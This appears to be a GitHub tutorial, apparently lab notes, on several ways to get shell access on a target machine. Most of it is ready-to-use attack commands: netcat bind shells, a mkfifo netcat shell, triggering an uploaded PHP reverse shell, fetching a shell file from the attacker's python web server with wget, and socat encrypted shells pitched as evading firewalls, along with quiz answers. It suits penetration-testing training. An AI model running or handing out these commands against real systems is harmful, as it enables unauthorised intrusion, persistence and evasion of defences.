# Various-process-of-getting-shell-access
Here We'll discuss how to get a shell in multiple ways -->

## For-Linuc-Remote-PC:

First assume your **ATTACK/HACKER PC IP** is **10.10.201.217** & your **REMOTE/ATTACKING/TARGET PC IP** is **10.10.152.101**

### _**Type-1: Simple bind shell using netcat**_

This is the easiest process. Assume you already has SSH ACCESS and netcat needs to be installed on both the devices.

1. Log in to Remote pc using ssh ID and pass. then type the below command in remote pc terminal-

    <pre><code><b>nc -lvnp 4000 -e /bin/bash</b></code></pre> 
   
   This will create a Bind shell in remote pc and it starts looking for any conenction on it's 4000 port

3. Now in attack pc terminal type
   
   <pre><code><b>nc 10.10.152.101 4000</b></code></pre>

this will connect you to remote pc shell using 4000 port

INSTEAD of above **method-1's point 1** you can use **below command in remote pc** which will help you to **delete the execution files and details ones the job is done** -

   <pre><code><b>mkfifo /tmp/f; nc -lvnp 1234 < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f</b></code></pre>  

   > Here's what each part of the command does:

   > **mkfifo /tmp/f:** Creates a **pipe named f** in **tmp** folder with **mkfifo** command. This is used for passing data between processes. **FIFO** means **first in** & **First out**

   > **nc -lvnp 1234 < /tmp/f:** Starts a netcat listener **(nc)** on port **1234** and reads input from the named pipe **/tmp/f**. When a connection is made, netcat pipes the input/output to /bin/sh, effectively spawning a shell.

   > **| /bin/sh >/tmp/f 2>&1**: This pipes the output of netcat to **/bin/sh**, which **starts a shell**. The shell's input and output are redirected to the named pipe **/tmp/f**. This effectively creates a reverse shell, where any commands entered on the attacking machine are executed on the target machine..

   > **rm /tmp/f**: Finally, this command removes the named pipe once the shell is closed, cleaning up after the operation

### _Type 2: using php-reverse-shell_ 
Assume you have uploaded a revershe shell file to the vulnerable web server by any means. Assume the file name is "shell.php" and it's in /var/www/html folder of 10.10.152.101 ip. Activate this file by typing below command in your browser in your attack machine

 <pre><code><b> http://10.10.152.101/shell.php</b></code></pre> 

(you'll see your browser starts loading and will become unresponsive, which means the shell has been activated)

Now try the below command in your attacking machine terminal

 <pre><code><b> nc -lvnp 1234  </b></code></pre> 

here the port number is the port number which you mentioned in your shell.php file

you can create the shell file from your kali linux /usr/share/webshells folder or you can use https://www.revshells.com/ or https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#summary to generate and download the file

### _Type 3: by using temporary webserver_ 
If somehow you have access to remote pc from before fro time being then for further and future access you can upload the reverse shell directly to the remote pc. 

In this process first create the reverse shell file, then in the same directory type the below command to start a http server on any port

 <pre><code><b> python3 -m http.server 8000 </b></code></pre> 

it means a temporay http server has been created using python on port 8000

then from remote pc download the file from attackers pc using the below command -

 <pre><code><b>wget http://attacker-pc-ip:8000/path-to-shell-file</b></code></pre> 

then after downloading it in remote pc, move it to /var/www/html folder or any other folder which you can access globally from anywhere. after that follow type 2 procedure to access later

## _USING SOCAT-_
SOCAT creates encrypted shell which is very useful to evade IDEs and other firewalls . But for that both attacker and remote machine needs to have socat installed in it.
After gaining access by following above processes you can transfer the socat binary from your local machine to the target machine (with IP address **10.10.152.101**)

 <pre><code><b>scp /path/to/socat user@10.10.152.101:/path/to/destination</b></code></pre>  

(usually socat path is **/usr/bin/socat** or you can use which socat to check the path)

for socat you need user access otherwise it'll become very tough to use SOCAT.

## _Create ENCRYPTED SHELL using SOCAT:_

We first need to generate a certificate in order to use encrypted shells. This is easiest to do on our attacking machine:

 <pre><code><b>openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt</b></code></pre> 

This command creates a 2048 bit RSA key with matching cert file, self-signed, and valid for just under a year. When you run this command it will ask you to fill in information about the certificate. This can be left blank, or filled randomly. 

We then need to merge the two created files into a single `.pem` file:

<pre><code><b>cat shell.key shell.crt > shell.pem</b></code></pre>

Now, when we set up our reverse shell listener, we use:

<pre><code><b>socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 -</b></code></pre> 

This sets up an OPENSSL listener using our generated certificate. `verify=0`
 tells the connection to not bother trying to validate that our certificate has been properly signed by a recognised authority. Please note that the certificate *must* be used on whichever device is listening.

 **To connect back, we would use:**
 
<pre><code><b>socat OPENSSL:<LOCAL-IP>:<LOCAL-PORT>,verify=0 EXEC:/bin/bash</b></code></pre>  

The same technique would apply for a **bind shell:**

**Target:**

<pre><code><b>socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 EXEC:cmd.exe,pipes</b></code></pre> 

**Attacker:**

<pre><code><b> socat OPENSSL:<TARGET-IP>:<TARGET-PORT>,verify=0 -</b></code></pre> 

Again, note that even for a Windows target, the certificate must be used with the listener, so copying the PEM file across for a bind shell is required.

The following image shows an OPENSSL Reverse shell from a Linux target. As usual, the target is on the right, and the attacker is on the left:

![UbOPN9q](https://github.com/Tony-Edward-Stark/various-process-of-getting-shell-access/assets/112267976/c36f2e52-e2f5-4b8f-8fa2-53fa8e6e5520)


## _EXAMPLE_

What is the syntax for setting up an OPENSSL-LISTENER using the tty technique from the previous task? Use port **53**, and a PEM file called "**encrypt.pem**"

<pre><code><b>socat OPENSSL-LISTEN:53,cert=encrypt.pem,verify=0 FILE:tty,raw,echo=0 - </b></code></pre>  

If your IP is **10.10.10.5**, what syntax would you use to connect back to this listener?

<pre><code><b>socat OPENSSL:10.10.10.5:53,EXEC:"bash -li",pty,stderr,sigint,setsid,sane </b></code></pre>  




